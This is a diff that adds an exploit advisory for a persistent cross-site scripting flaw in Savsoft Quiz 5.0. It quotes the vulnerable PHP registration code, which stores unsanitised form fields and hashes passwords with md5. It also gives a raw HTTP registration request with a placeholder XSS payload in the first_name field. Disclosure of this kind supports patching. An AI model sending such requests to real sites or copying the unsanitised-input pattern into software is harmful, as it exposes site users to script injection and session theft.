@@ -1,0 +1,65 @@
+# Exploit Title: Savsoft Quiz 5 - Persistent Cross-Site Scripting
+# Date: 2020-07-09
+# Exploit Author: Ogulcan Unveren(th3d1gger)
+# Vendor Homepage:  https://savsoftquiz.com/
+# Software Link:  https://github.com/savsofts/savsoftquiz_v5.git
+# Version: 5.0
+# Tested on: Kali Linux
+
+---Vulnerable Source Code----
+  function insert_user_2(){
+
+		$userdata=array(
+		'email'=>$this->input->post('email'),
+		'password'=>md5($this->input->post('password')),
+		'first_name'=>$this->input->post('first_name'),
+		'last_name'=>$this->input->post('last_name'),
+		'contact_no'=>$this->input->post('contact_no'),
+		'gid'=>implode(',',$this->input->post('gid')),
+		'su'=>'2'
+		);
+		$veri_code=rand('1111','9999');
+		 if($this->config->item('verify_email')){
+			$userdata['verify_code']=$veri_code;
+		 }
+		 		if($this->session->userdata('logged_in_raw')){
+					$userraw=$this->session->userdata('logged_in_raw');
+					$userraw_uid=$userraw['uid'];
+					$this->db->where('uid',$userraw_uid);
+				$rresult=$this->db->update('savsoft_users',$userdata);
+				if($this->session->userdata('logged_in_raw')){
+				$this->session->unset_userdata('logged_in_raw');
+				}
+				}else{
+
+		$rresult=$this->db->insert('savsoft_users',$userdata);
+		$uid=$this->db->insert_id();
+		foreach($_POST['custom'] as $ck => $cv){
+			if($cv != ''){
+		$savsoft_users_custom=array(
+		'field_id'=>$ck,
+		'uid'=>$uid,
+		'field_values'=>$cv
+		);
+		$this->db->insert('savsoft_users_custom',$savsoft_users_custom);
+			}
+		}
+
+
+
+
+----Vulnerable Request---
+POST /index.php/login/insert_user/ HTTP/1.1
+Host: savsoftquiz_v5
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.2/index.php/login/registration/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 231
+Connection: close
+Cookie: ci_session=0lhlr1iv1qgru1u1kmg42lbvj8mprokv
+Upgrade-Insecure-Requests: 1
+
+email=hello%40gmail.com&password=password&first_name=XSSPAYLOAD&last_name=test&contact_no=05785555555&gid%5B%5D=1
